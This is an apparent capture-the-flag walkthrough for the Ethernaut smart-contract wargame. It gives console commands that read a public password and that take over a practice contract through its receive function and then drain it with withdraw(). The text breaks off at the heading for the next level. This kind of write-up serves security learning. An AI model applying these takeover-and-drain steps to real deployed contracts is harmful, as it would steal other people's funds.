# Ethernaut

## 0. Hello Ethernaut

* Flag "ethernaut0" is stored in the public `password` field

```
await contract.password()
```

* Calling `authenticate("ethernaut0")` solves the tutorial

```
await contract.authenticate("ethernaut0")
```

## 1. Fallback

* The `receive` function sets `owner = msg.sender` if the sender sends any
  amount of eth and also has a non-zero entry in the contributions mapping

* Send 0.0001 eth via `contribute` function to register a non-zero contribution
  for the sender address (send < 0.001 eth to get past the require statement)

```
await contract.contribute({value: toWei("0.0001")})
```

* Trigger the receive function by sending eth directly to the contract address

```
await sendTransaction({
  'from': player,
  'to': contract.address,
  'value': 1,
  'gas': 30000,
})
```

* We are now the owner. Call `withdraw` to drain the contract.

```
await contract.withdraw()
```

## 2. Fallout




